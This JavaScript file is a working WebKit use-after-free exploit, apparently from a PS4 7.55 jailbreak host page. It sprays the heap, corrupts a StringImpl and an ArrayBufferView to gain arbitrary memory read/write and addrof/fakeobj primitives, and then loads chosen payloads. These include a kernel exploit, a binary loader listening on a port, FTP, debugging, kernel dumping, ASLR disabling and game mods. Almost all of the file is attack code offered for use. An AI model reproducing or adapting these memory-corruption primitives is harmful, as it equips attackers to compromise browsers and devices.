const OFFSET_ELEMENT_REFCOUNT = 0x10;
const OFFSET_JSAB_VIEW_VECTOR = 0x10;
const OFFSET_JSAB_VIEW_LENGTH = 0x18;
const OFFSET_LENGTH_STRINGIMPL = 0x04;
const OFFSET_HTMLELEMENT_REFCOUNT = 0x14;

const LENGTH_ARRAYBUFFER = 0x8;
const LENGTH_STRINGIMPL = 0x14;
const LENGTH_JSVIEW = 0x20;
const LENGTH_VALIDATION_MESSAGE = 0x30;
const LENGTH_TIMER = 0x48;
const LENGTH_HTMLTEXTAREA = 0xd8;

const SPRAY_ELEM_SIZE = 0x6000;
const SPRAY_STRINGIMPL = 0x1000;

const NB_FRAMES = 0xfa0;
const NB_REUSE = 0x8000;

var g_arr_ab_1 = [];
var g_arr_ab_2 = [];
var g_arr_ab_3 = [];

var g_frames = [];

var g_relative_read = null;
var g_relative_rw = null;
var g_ab_slave = null;
var g_ab_index = null;

var g_timer_leak = null;
var g_jsview_leak = null;
var g_jsview_butterfly = null;
var g_message_heading_leak = null;
var g_message_body_leak = null;

var g_textarea_div_elem = null;
var g_obj_str = {};

var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";

var g_round = 1;
var g_input = null;

var guess_htmltextarea_addr = new Int64("0x2031b00d8");


/* Executed after deleteBubbleTree */
function setupRW() {
	/* Now the m_length of the JSArrayBufferView should be 0xffffff01 */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length > 0xff) {
			g_relative_rw = g_arr_ab_3[i];
			debug_log("-> Succesfully got a relative R/W");
			break;
		}
	}
	if (g_relative_rw === null)
		die("[!] Failed to setup a relative R/W primitive");

	debug_log("-> Setting up arbitrary R/W");

	/* Retrieving the ArrayBuffer address using the relative read */
	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));

	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
	let ab_index = g_jsview_leak.sub(ab_addr).low32();
	if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER)
		g_ab_index = ab_index + LENGTH_JSVIEW;
	else
		g_ab_index = ab_index - LENGTH_JSVIEW;

	/* Overding the length of one JSArrayBufferView with a known value */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0x41;

	/* Looking for the slave JSArrayBufferView */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length === 0x41) {
			g_ab_slave = g_arr_ab_3[i];
			g_arr_ab_3 = null;
			break;
		}
	}
	if (g_ab_slave === null)
		die("[!] Didn't found the slave JSArrayBufferView");

	/* Extending the JSArrayBufferView length */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;

	debug_log("-> Testing arbitrary R/W");

	let saved_vtable = read64(guess_htmltextarea_addr);
	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
		die("[!] Failed to setup arbitrary R/W primitive");

	debug_log("-> Succesfully got arbitrary R/W!");

	/* Restore the overidden vtable pointer */
	write64(guess_htmltextarea_addr, saved_vtable);

	/* Cleanup memory */
	cleanup();

	/* Set up addrof/fakeobj primitives */
	g_ab_slave.leakme = 0x1337;
	var bf = 0;
	for(var i = 15; i >= 8; i--)
		bf = 256 * bf + g_relative_rw[g_ab_index + i];
	g_jsview_butterfly = new Int64(bf);
	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
		die("[!] Failed to setup addrof/fakeobj primitives");
	if(localStorage.autoExploit=="true")
		debug_log("-> WebKit Exploit Complete.. Running Kernel Exploit !!");
	else
		debug_log("-> WebKit Exploit Complete.. Running Jailbreak.. Please wait !!");

	/* Getting code execution */
	/* ... */
	if(window.postExploit)
		window.postExploit();

}

function load_trainer(){
	var link = document.createElement('a');
		  document.body.appendChild(link);
		  link.href = 'http://night-king.karo218.ir/trainer/index.html';
		  link.click();
		  }

function toggle_payload(pld){
	if(pld == "exploit"){
		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
		preloadScripts(['jb/jb.js']);
	}else if(pld == "binloader"){
		document.getElementById("progress").innerHTML="Awaiting Payload.. Send Payload to port 9020..";
		preloadScripts(['payloads/preloader.js', 'payloads/loader.js']);
	}else if(pld == "mira75X"){
		document.getElementById("progress").innerHTML="Loading MIRA.. Please wait..";
		if(fw=="755"){
			preloadScripts(['payloads/preloader.js', 'payloads/mira_755.js', 'payloads/loader.js']);
		}else{
			preloadScripts(['payloads/preloader_'+fw+'.js', 'payloads/mira_'+fw+'.js', 'payloads/loader_'+fw+'.js']);	
		}
	}else if(pld == "mira2b"){
		document.getElementById("progress").innerHTML="Loading MIRA + SPOOF.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/mira2b.js', 'payloads/loader.js']);
	}else if(pld == "ftp"){
		setTimeout(function(){document.getElementById("progress").innerHTML="FTP Loaded.. Access at port 1337.."; }, 7000);
		preloadScripts(['payloads/preloader.js', 'payloads/ftp.js', 'payloads/loader.js']);
	}else if(pld == "app2usb"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/app2usb.js', 'payloads/loader.js']);
	}else if(pld == "disableupdates"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/disableupdates.js', 'payloads/loader.js']);
	}else if(pld == "enableupdates"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/enableupdates.js', 'payloads/loader.js']);
	}else if(pld == "backup"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/backup.js', 'payloads/loader.js']);
	}else if(pld == "restore"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/restore.js', 'payloads/loader.js']);
	}else if(pld == "rifrenamer"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/rifrenamer.js', 'payloads/loader.js']);
	}else if(pld == "todex"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/todex.js', 'payloads/loader.js']);
	}else if(pld == "dumper"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/dumper.js', 'payloads/loader.js']);
	}else if(pld == "disableaslr"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/disableaslr.js', 'payloads/loader.js']);
	}else if(pld == "kerneldumper"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/kerneldumper.js', 'payloads/loader.js']);
	}else if(pld == "kernelclock"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/kernelclock.js', 'payloads/loader.js']);
	}else if(pld == "enablebrowser"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/enablebrowser.js', 'payloads/loader.js']);
	}else if(pld == "historyblocker"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/historyblocker.js', 'payloads/loader.js']);
	}else if(pld == "exitidu"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/exitidu.js', 'payloads/loader.js']);
	}else if(pld == "ps4debug"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/ps4debug.js', 'payloads/loader.js']);
	}else if(pld == "goldhen11"){
		document.getElementById("progress").innerHTML="Loading GoldHen V1.1 .. Please wait..";
		if(fw=="755"){
			preloadScripts(['payloads/preloader.js', 'payloads/goldhen11_755.js', 'payloads/loader.js']);
		}else{
			preloadScripts(['payloads/preloader.js', 'payloads/goldhen11_'+fw+'.js', 'payloads/loader.js']);	
		}
	}else if(pld == "goldhen20"){
		document.getElementById("progress").innerHTML="Loading GoldHen V2.0b .. Please wait..";
		if(fw=="755"){
			preloadScripts(['payloads/preloader.js', 'payloads/goldhen20_755.js', 'payloads/loader.js']);
		}else{
			preloadScripts(['payloads/preloader.js', 'payloads/goldhen20_'+fw+'.js', 'payloads/loader.js']);	
		}
	}else if(pld == "goldhen11b7"){
		document.getElementById("progress").innerHTML="Loading GoldHen V1.1 Beta7.. Please wait..";
		if(fw=="755"){
			preloadScripts(['payloads/preloader.js', 'payloads/goldhen11b7_755.js', 'payloads/loader.js']);
		}else{
			preloadScripts(['payloads/preloader.js', 'payloads/goldhen11b7_'+fw+'.js', 'payloads/loader.js']);	
		}
	}else if(pld == "goldhen10"){
		document.getElementById("progress").innerHTML="Loading GoldHen V1.0.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/goldhen10.js', 'payloads/loader.js']);
	}else if(pld == "webrte"){
		document.getElementById("progress").innerHTML="Loading Webrte.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/webrte.js', 'payloads/loader.js']);
	}else if(pld == "orbistoolbox"){
	document.getElementById("progress").innerHTML="Loading Orbis-Toolbox.. Please wait..";
	preloadScripts(['payloads/preloader.js', 'payloads/orbistoolbox.js', 'payloads/loader.js']);
    }else if(pld == "webactivator"){
	document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
	preloadScripts(['payloads/preloader.js', 'payloads/payload.js', 'payloads/loader.js', 'payloads/frontend.js']);}
	else if(pld == "fan50"){
	document.getElementById("progress").innerHTML="Loading fan-50�.. Please wait..";
	preloadScripts(['payloads/preloader.js', 'payloads/fan50.js', 'payloads/loader.js']);	
	}else if(pld == "fan55"){
	document.getElementById("progress").innerHTML="Loading fan-55�.. Please wait..";
	preloadScripts(['payloads/preloader.js', 'payloads/fan55.js', 'payloads/loader.js']);	
	}else if(pld == "fan60"){
    document.getElementById("progress").innerHTML="Loading fan-60�.. Please wait..";
	preloadScripts(['payloads/preloader.js', 'payloads/fan60.js', 'payloads/loader.js']);	
	}else if(pld == "fan65"){
    document.getElementById("progress").innerHTML="Loading fan-65�.. Please wait..";
    preloadScripts(['payloads/preloader.js', 'payloads/fan65.js', 'payloads/loader.js']);	
    }else if(pld == "fan70"){
	document.getElementById("progress").innerHTML="Loading fan-70�.. Please wait..";
	preloadScripts(['payloads/preloader.js', 'payloads/fan70.js', 'payloads/loader.js']);			
	}else if(pld == "Silver755"){
		document.getElementById("progress").innerHTML="Loading Platinum755x82-v1.1b.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/Silver755.js', 'payloads/loader.js']);
	}else if(pld == "Silver755x82-1.2"){
		document.getElementById("progress").innerHTML="Loading Platinum755x82-v1.1a-Spoofed.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/Silver755x82-1.2.js', 'payloads/loader.js']);	
		}else if(pld == "BeefQueefMod133"){
		document.getElementById("progress").innerHTML="Loading Gta 5 BeefQueefMod 1.33.. Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/BeefQueefMod133.js', 'payloads/loader.js']);
    }else if(pld == "ArabicMod132"){
		document.getElementById("progress").innerHTML="Loading Gta 5 ArabicMod 1.32 Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/ArabicMod132.js', 'payloads/loader.js']);
		}else if(pld == "rdr2mod124"){
		document.getElementById("progress").innerHTML="Loading Rdr2 Mod 1.24 Please wait..";
		preloadScripts(['payloads/preloader.js', 'payloads/rdr2mod124.js', 'payloads/loader.js']);
    }
			
	if(window.postPayload)
		window.postPayload();
	payload_finished(pld);
	
    }

function payload_finished(payload)
{
	if(payload == "binloader"){
		setTimeout(function(){document.getElementById("progress").innerHTML="Awaiting Payload!! Send Payload To Port 9021"; }, 7000);
	} else if(payload != "exploit"){
		setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 7.55 Payload Loaded Succesfully !!"; }, 7000);
	}
}


function read(addr, length) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	let arr = [];
	for (let i = 0; i < length; i++)
		arr.push(g_ab_slave[i]);
	return arr;
}

function read64(addr) {
	return new Int64(read(addr, 8));
}

function write(addr, data) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	for (let i = 0; i < data.length; i++)
		g_ab_slave[i] = data[i];
}

function write64(addr, data) {
	write(addr, data.bytes());
}

function addrof(obj) {
	g_ab_slave.leakme = obj;
	return read64(g_jsview_butterfly.sub(16));
}

function fakeobj(addr) {
	write64(g_jsview_butterfly.sub(16), addr);
	return g_ab_slave.leakme;
}

function cleanup() {
	select1.remove();
	select1 = null;
	input1.remove();
	input1 = null;
	input2.remove();
	input2 = null;
	input3.remove();
	input3 = null;
	div1.remove();
	div1 = null;
	g_input = null;
	g_rows1 = null;
	g_rows2 = null;
	g_frames = null;
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound2() {
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");

	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();

	setTimeout(setupRW, 6000);
}


/* Executed after deleteBubbleTree */
function leakJSC() {
	debug_log("-> Looking for the smashed StringImpl...");

	var arr_str = Object.getOwnPropertyNames(g_obj_str);

	/* Looking for the smashed string */
	for (let i = arr_str.length - 1; i > 0; i--) {
		if (arr_str[i].length > 0xff) {
			debug_log("-> StringImpl corrupted successfully");
			g_relative_read = arr_str[i];
			g_obj_str = null;
			break;
		}
	}
	if (g_relative_read === null)
		die("[!] Failed to setup a relative read primitive");

	debug_log("-> Got a relative read");

        var tmp_spray = {};
        for(var i = 0; i < 100000; i++)
                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;

	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);

	/* Spraying JSView */
	let tmp = [];
	for (let i = 0; i < 0x10000; i++) {
		/* The last allocated are more likely to be allocated after our relative read */
		if (i >= 0xfc00)
			g_arr_ab_3.push(new Uint8Array(ab));
		else
			tmp.push(new Uint8Array(ab));
	}
	tmp = null;

	/*
	 * Force JSC ref on FastMalloc Heap
	 * https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js#L151
	 */
	var props = [];
	for (var i = 0; i < 0x400; i++) {
		props.push({ value: 0x42424242 });
		props.push({ value: g_arr_ab_3[i] });
	}

	/* 
	 * /!\
	 * This part must avoid as much as possible fastMalloc allocation
	 * to avoid re-using the targeted object 
	 * /!\ 
	 */
	/* Use relative read to find our JSC obj */
	/* We want a JSView that is allocated after our relative read */
	while (g_jsview_leak === null) {
		Object.defineProperties({}, props);
		for (let i = 0; i < 0x800000; i++) {
			var v = undefined;
			if (g_relative_read.charCodeAt(i) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x01) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x02) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x03) === 0x42) {
				if (g_relative_read.charCodeAt(i + 0x08) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x0f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x10) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x17) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x18) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x1f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x28) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x2f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x30) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x13) === 0x42)
					v = new Int64(str2array(g_relative_read, 8, i + 8));
			}
			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
				g_jsview_leak = v;
				props = null;
				break;
			}
		}
	}
	/* 
	 * /!\
	 * Critical part ended-up here
	 * /!\ 
	 */

	debug_log("-> JSArrayBufferView: " + g_jsview_leak);

	/* Run the exploit again */
	prepareUAF();
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound1() {
	/* Force allocation of StringImpl obj. beyond Timer address */
	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);

	/* Checking for leaked data */
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");

	dumpTargetObj();

	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();

	/*
	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
	 * the next 5s
	 */
	setTimeout(leakJSC, 6000);
}

function handle2() {
	/* focus elsewhere */
	input2.focus();
}

function reuseTargetObj() {
	/* Delete ValidationMessage instance */
	document.body.appendChild(g_input);

	/*
	 * Free ValidationMessage neighboors.
	 * SmallLine is freed -> SmallPage is cached
	 */
	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
		g_frames[i].setAttribute("rows", ',');

	/* Get back target object */
	for (let i = 0; i < NB_REUSE; i++) {
		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
		let view = new Float64Array(ab);

		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble

		g_arr_ab_1.push(view);
	}

	if (g_round == 1) {
		/*
		 * Spray a couple of StringImpl obj. prior to Timer allocation
		 * This will force Timer allocation on same SmallPage as our Strings
		 */
		sprayStringImpl(0, SPRAY_STRINGIMPL);

		g_frames = [];
		g_round += 1;
		g_input = input3;

		setTimeout(confuseTargetObjRound1, 10);
	} else {
		setTimeout(confuseTargetObjRound2, 10);
	}
}

function dumpTargetObj() {
	debug_log("-> m_timer: " + g_timer_leak);
	debug_log("-> m_messageHeading: " + g_message_heading_leak);
	debug_log("-> m_messageBody: " + g_message_body_leak);
}

function findTargetObj() {
	for (let i = 0; i < g_arr_ab_1.length; i++) {
		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
			debug_log("-> Found fake ValidationMessage");

			if (g_round === 2) {
				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
				g_round++;
			}

			g_fake_validation_message = g_arr_ab_1[i];
			g_arr_ab_1 = [];
			return true;
		}
	}
	return false;
}

function prepareUAF() {
	g_input.setCustomValidity("ps4");

	for (let i = 0; i < NB_FRAMES; i++) {
		var element = document.createElement("frameset");
		g_frames.push(element);
	}

	g_input.reportValidity();
	var div = document.createElement("div");
	document.body.appendChild(div);
	div.appendChild(g_input);

	/* First half spray */
	for (let i = 0; i < NB_FRAMES / 2; i++)
		g_frames[i].setAttribute("rows", g_rows1);

	/* Instantiate target obj */
	g_input.reportValidity();

	/* ... and the second half */
	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
		g_frames[i].setAttribute("rows", g_rows2);

	g_input.setAttribute("onfocus", "reuseTargetObj()");
	g_input.autofocus = true;
}

/* HTMLElement spray */
function sprayHTMLTextArea() {
	debug_log("-> Spraying HTMLTextareaElement ...");

	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
	document.body.appendChild(textarea_div_elem);
	textarea_div_elem.id = "div1";
	var element = document.createElement("textarea");

	/* Add a style to avoid textarea display */
	element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';

	/*
	 * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
	 * allocation of the node attributes and an IsoHeap allocation of the
	 * Element. The virtual page layout will look something like that:
	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...]
	 */
	for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
		textarea_div_elem.appendChild(element.cloneNode());
}

/* StringImpl Spray */
function sprayStringImpl(start, end) {
	for (let i = start; i < end; i++) {
		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
		g_obj_str[s] = 0x1337;
	}
}

function go() {
if(localStorage.is755BCached){
		sprayHTMLTextArea();
		isJB = getCookie("Jailbreak");
		if(isJB == ""){
			isJB = confirm("Do you want to run Jailbreak?");
			document.cookie="Jailbreak="+isJB;
		}
		if(String(isJB) == "true"){
			if(window.midExploit)
				window.midExploit();
		}
		g_input = input1;
		/* Shape heap layout for obj. reuse */
		prepareUAF();
	}
}

function getCookie(cname) {
  var name = cname + "=";
  var decodedCookie = decodeURIComponent(document.cookie);
  var ca = decodedCookie.split(';');
  for(var i = 0; i <ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}